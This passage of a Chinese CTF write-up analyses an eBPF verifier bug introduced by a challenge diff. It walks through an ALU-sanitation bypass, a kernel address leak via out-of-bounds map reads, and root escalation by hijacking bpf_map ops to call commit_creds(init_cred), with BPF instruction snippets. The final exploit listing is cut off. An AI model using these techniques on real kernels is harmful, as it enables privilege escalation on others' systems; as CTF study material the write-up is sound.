class="number">4448</span>,<span class="number">10</span> @@ <span class="keyword">static</span> <span class="keyword">int</span> packet_set_ring(struct sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> out_free_pg_vec:</span><br><span class="line">-bitmap_free(rx_owner_map);</span><br><span class="line">-<span class="keyword">if</span> (pg_vec)</span><br><span class="line">+<span class="keyword">if</span> (pg_vec) &#123;</span><br><span class="line">+bitmap_free(rx_owner_map); <span class="comment">// patch for CVE-2021-22600</span></span><br><span class="line"> free_pg_vec(pg_vec, order, req-&gt;tp_block_nr);</span><br><span class="line">+&#125;</span><br><span class="line"> out:</span><br><span class="line"> <span class="keyword">return</span> err;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目拿到手之后是一个diff文件，在文件最上面有一个patch是为了修复<code>CVE-2022-0185</code>，在文件的最下面是一个patch，也明说了就是为了修复<code>CVE-2021-22600</code>，不过上面还有一段修改。</p><p>上面将原本的语句删除了，并且添加了几条语句。原本的语句中的，在进行RSH时，如果超过31或则63则将寄存器设置为unkown。但是在修改过后的语句中如果超过了63或者31不是设置为unknown而是默认设置为0。</p><p>这里因为架构的原因，如果我们使用右移64位得到的结果为1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x 1 &gt;&gt; 64</span><br><span class="line"><span class="variable">$3</span> = 0x1</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>所以题目这里给的漏洞为，在verifier为0但是在runtime为1的寄存器。</p><p>观察题目的启动命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -m 128M \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -initrd rootfs.cpio \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 kaslr quiet&#x27;</span> \</span><br><span class="line">  -monitor /dev/null \</span><br><span class="line">  -cpu kvm64,+smep,+smap \</span><br><span class="line">  -smp cores=1,threads=1 \</span><br><span class="line">  -nographic \</span><br><span class="line">  -s</span><br></pre></td></tr></table></figure><p>基本上能开的都开了，启动虚拟机也可以查看，其实kpti也是打开了的。</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><h3 id="泄漏"><a href="#泄漏" class="headerlink" title="泄漏"></a>泄漏</h3><p>因为我们现在有一个verifier为0，runtime为1的寄存器所以我们可以尝试越界读来造成泄漏，首先就需要认识<code>bpf_map</code>结构体:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line"><span class="comment">/* The first two cachelines with read-mostly members of which some</span></span><br><span class="line"><span class="comment"> * are also accessed in fast-path (e.g. ops, max_entries).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">inner_map_meta</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span> *security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_map_type</span> <span class="title">map_type</span>;</span></span><br><span class="line">u32 key_size;</span><br><span class="line">u32 value_size;</span><br><span class="line">u32 max_entries;</span><br><span class="line">u32 map_flags;</span><br><span class="line"><span class="keyword">int</span> spin_lock_off; <span class="comment">/* &gt;=0 valid offset, &lt;0 error */</span></span><br><span class="line">u32 id;</span><br><span class="line"><span class="keyword">int</span> numa_node;</span><br><span class="line">u32 btf_key_type_id;</span><br><span class="line">u32 btf_value_type_id;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">u32 btf_vmlinux_value_type_id;</span><br><span class="line"><span class="keyword">bool</span> bypass_spec_v1;</span><br><span class="line"><span class="keyword">bool</span> frozen; <span class="comment">/* write-once; write-protected by freeze_mutex */</span></span><br><span class="line"><span class="comment">/* 22 bytes hole */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The 3rd and 4th cacheline with misc members to avoid false sharing</span></span><br><span class="line"><span class="comment"> * particularly with refcounting.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">atomic64_t</span> refcnt ____cacheline_aligned;</span><br><span class="line"><span class="keyword">atomic64_t</span> usercnt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">freeze_mutex</span>;</span></span><br><span class="line">u64 writecnt; <span class="comment">/* writable mmap cnt; protected by freeze_mutex */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果我们在开始定义类型为<code>BPF_MAP_TYPE_ARRAY</code>那么结构体如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> <span class="title">map</span>;</span></span><br><span class="line">u32 elem_size;</span><br><span class="line">u32 index_mask;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array_aux</span> *<span class="title">aux</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span> value[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">void</span> *ptrs[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">void</span> __percpu *pptrs[<span class="number">0</span>] __aligned(<span class="number">8</span>);</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到在上面的<code>bpf_map</code>结构体的开始位置有一个ops指针，而根据以往的经验ops中包含了很多内核函数的指针，当然事实也正如此</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> <span class="title">array_map_ops</span> =</span> &#123;</span><br><span class="line">.map_meta_equal = array_map_meta_equal,</span><br><span class="line">.map_alloc_check = array_map_alloc_check,</span><br><span class="line">.map_alloc = array_map_alloc,</span><br><span class="line">.map_free = array_map_free,</span><br><span class="line">.map_get_next_key = array_map_get_next_key,</span><br><span class="line">.map_lookup_elem = array_map_lookup_elem,</span><br><span class="line">.map_update_elem = array_map_update_elem,</span><br><span class="line">.map_delete_elem = array_map_delete_elem,</span><br><span class="line">.map_gen_lookup = array_map_gen_lookup,</span><br><span class="line">.map_direct_value_addr = array_map_direct_value_addr,</span><br><span class="line">.map_direct_value_meta = array_map_direct_value_meta,</span><br><span class="line">.map_mmap = array_map_mmap,</span><br><span class="line">.map_seq_show_elem = array_map_seq_show_elem,</span><br><span class="line">.map_check_btf = array_map_check_btf,</span><br><span class="line">.map_lookup_batch = generic_map_lookup_batch,</span><br><span class="line">.map_update_batch = generic_map_update_batch,</span><br><span class="line">.map_btf_name = <span class="string">&quot;bpf_array&quot;</span>,</span><br><span class="line">.map_btf_id = &amp;array_map_btf_id,</span><br><span class="line">.iter_seq_info = &amp;iter_seq_info,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为我们上面所选择的类型为数组，所以这里ops会包含<code>array_map_ops</code>指针，所以我们可以利用它来泄漏内核地址。</p><p>如果我们使用<code>BPF_FUNC_map_lookup_elem</code>来进行函数调用的话，根据上述ops我们最终会调用到<code>array_map_lookup_elem</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Called from syscall or from eBPF program */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">array_map_lookup_elem</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> *<span class="title">array</span> =</span> container_of(<span class="built_in">map</span>, struct bpf_array, <span class="built_in">map</span>);</span><br><span class="line">u32 index = *(u32 *)key;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(index &gt;= <span class="built_in">array</span>-&gt;<span class="built_in">map</span>.max_entries))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">array</span>-&gt;value + <span class="built_in">array</span>-&gt;elem_size * (index &amp; <span class="built_in">array</span>-&gt;index_mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的注释也说明了，这里允许被syscall以及eBPF程序调用。而这里程序的返回内容则是<code>map_ptr.value</code>所以可以根据这里的偏移得出返回内容为<code>map_ptr+0x110</code>的地址。</p><p>可能到这里大家都应该有一定的思路了，不过这里还存在一个检测<code>ALU Sanitation</code>，在这个检测中<code>alu_limit</code>表示操作允许最大值，这里做限制的主要目的是防止通过ebpf程序调用出现越界或访问不属于他自己的地址区域时所做的限制，如果我们<code>src_reg</code>的值大于<code>alu_limit</code>或者与之符号相反，那么<code>src_reg</code>会被强制制为0，导致指针运算失败。不过在这里绕过的方式也比较简单。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV64_REG(BPF_REG_0, EXP_REG),</span><br><span class="line">BPF_ALU64_IMM(BPF_ADD, OOB_REG, <span class="number">0x1000</span>),</span><br><span class="line">BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, <span class="number">0x1000</span> - <span class="number">1</span>),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br></pre></td></tr></table></figure><p>因为这里存在一个verifier为0的寄存器<code>EXP_REG</code>那么我们如果进行上述代码中的操作即可是的<code>alm_limit</code>为<code>0x1000</code></p><p>那么在做完上文中所有操作之后可以正式进入泄漏阶段了，其实有了上述思路，这里泄漏起来就比较简单了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span>),</span><br><span class="line">BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, <span class="number">0</span>),</span><br><span class="line">BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">BPF_EXIT_INSN(),</span><br></pre></td></tr></table></figure><p>只需要将<code>oob_map</code>的<code>array_map_ops</code>放到<code>store_map</code>的value中去即可。并且在<code>bpf_map</code>中存在一个成员work是一个双向链表的结构，其中存在一个地址指向自己，这样我们即可获取<code>oob_map</code>的地址了。</p><p>不过在实际做的过程中会发现上述利用方式会存在许多问题，达不到真正意义上的任意内存读，这里我忘记了具体原因，应该是会检测寄存器的值不能为堆栈以外的地址，所以还需要利用一个新的办法，<code>obj_get_info_by_fd</code>函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_map_get_info_by_fd</span><span class="params">(struct file *file,</span></span></span><br><span class="line"><span class="params"><span class="function">  struct bpf_map *<span class="built_in">map</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">const</span> <span class="keyword">union</span> bpf_attr *attr,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">union</span> bpf_attr __user *uattr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> __<span class="title">user</span> *<span class="title">uinfo</span> =</span> u64_to_user_ptr(attr-&gt;info.info);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info</span> <span class="title">info</span>;</span></span><br><span class="line">u32 info_len = attr-&gt;info.info_len;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = bpf_check_uarg_tail_zero(uinfo, <span class="keyword">sizeof</span>(info), info_len);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">info_len = <span class="keyword">min_t</span>(u32, <span class="keyword">sizeof</span>(info), info_len);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;info, <span class="number">0</span>, <span class="keyword">sizeof</span>(info));</span><br><span class="line">info.type = <span class="built_in">map</span>-&gt;map_type;</span><br><span class="line">info.id = <span class="built_in">map</span>-&gt;id;</span><br><span class="line">info.key_size = <span class="built_in">map</span>-&gt;key_size;</span><br><span class="line">info.value_size = <span class="built_in">map</span>-&gt;value_size;</span><br><span class="line">info.max_entries = <span class="built_in">map</span>-&gt;max_entries;</span><br><span class="line">info.map_flags = <span class="built_in">map</span>-&gt;map_flags;</span><br><span class="line"><span class="built_in">memcpy</span>(info.name, <span class="built_in">map</span>-&gt;name, <span class="keyword">sizeof</span>(<span class="built_in">map</span>-&gt;name));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">map</span>-&gt;btf) &#123;</span><br><span class="line">info.btf_id = btf_obj_id(<span class="built_in">map</span>-&gt;btf);</span><br><span class="line">info.btf_key_type_id = <span class="built_in">map</span>-&gt;btf_key_type_id;</span><br><span class="line">info.btf_value_type_id = <span class="built_in">map</span>-&gt;btf_value_type_id;</span><br><span class="line">&#125;</span><br><span class="line">info.btf_vmlinux_value_type_id = <span class="built_in">map</span>-&gt;btf_vmlinux_value_type_id;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">err = bpf_map_offload_info_fill(&amp;info, <span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copy_to_user(uinfo, &amp;info, info_len) ||</span><br><span class="line">    put_user(info_len, &amp;uattr-&gt;info.info_len))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">u32 <span class="title">btf_obj_id</span><span class="params">(<span class="keyword">const</span> struct btf *btf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> btf-&gt;id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以如果我们控制<code>bpf_map</code>结构体中的btf即可实现真正意义上的任意地址泄漏。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>其实这里的提权方式可能大家都能想到，因为在<code>bpf_map</code>结构体中存在一个结构体为ops，而我们在以往的kernel题目中利用的比较多的就是这个ops，所以这里同样可以这样使用。</p><p>这里选择的最终利用函数是前面提到过的<code>work_for_cpu_fn</code>函数。过程就是，首先我们需要先泄漏出当前ops结构体中的所有函数地址，随后将函数地址中<code>map_get_next_key</code>函数所在位置的指针替换为<code>work_for_cpu_fn</code>，紧接着写入到<code>oob_map</code>的value中去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> __user *ukey = u64_to_user_ptr(attr-&gt;key);</span><br><span class="line"><span class="keyword">void</span> __user *unext_key = u64_to_user_ptr(attr-&gt;next_key);</span><br><span class="line"><span class="keyword">int</span> ufd = attr-&gt;map_fd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line"><span class="keyword">void</span> *key, *next_key;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (CHECK_ATTR(BPF_MAP_GET_NEXT_KEY))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">f = fdget(ufd);</span><br><span class="line"><span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">if</span> (!(map_get_sys_perms(<span class="built_in">map</span>, f) &amp; FMODE_CAN_READ)) &#123;</span><br><span class="line">err = -EPERM;</span><br><span class="line"><span class="keyword">goto</span> err_put;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ukey) &#123;</span><br><span class="line">key = __bpf_copy_key(ukey, <span class="built_in">map</span>-&gt;key_size);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(key)) &#123;</span><br><span class="line">err = PTR_ERR(key);</span><br><span class="line"><span class="keyword">goto</span> err_put;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">key = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">next_key = kvmalloc(<span class="built_in">map</span>-&gt;key_size, GFP_USER);</span><br><span class="line"><span class="keyword">if</span> (!next_key)</span><br><span class="line"><span class="keyword">goto</span> free_key;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">err = bpf_map_offload_get_next_key(<span class="built_in">map</span>, key, next_key);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rcu_read_lock();</span><br><span class="line">err = <span class="built_in">map</span>-&gt;ops-&gt;map_get_next_key(<span class="built_in">map</span>, key, next_key);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> free_next_key;</span><br><span class="line"></span><br><span class="line">err = -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (copy_to_user(unext_key, next_key, <span class="built_in">map</span>-&gt;key_size) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> free_next_key;</span><br><span class="line"></span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">free_next_key:</span><br><span class="line">kvfree(next_key);</span><br><span class="line">free_key:</span><br><span class="line">kvfree(key);</span><br><span class="line">err_put:</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里选择这个函数的很明显，在中途直接调用了ops中的<code>map_get_next_key</code>，并且第一个参数为map。那么这个时候我们如果修改ops为我们的<code>bpf-&gt;value</code>即可调用到<code>work_for_cpu_fn</code>，那么在根据<code>work_for_cpu_fn</code>函数内部调整<code>commit_creds</code>和<code>init_cred</code>即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span 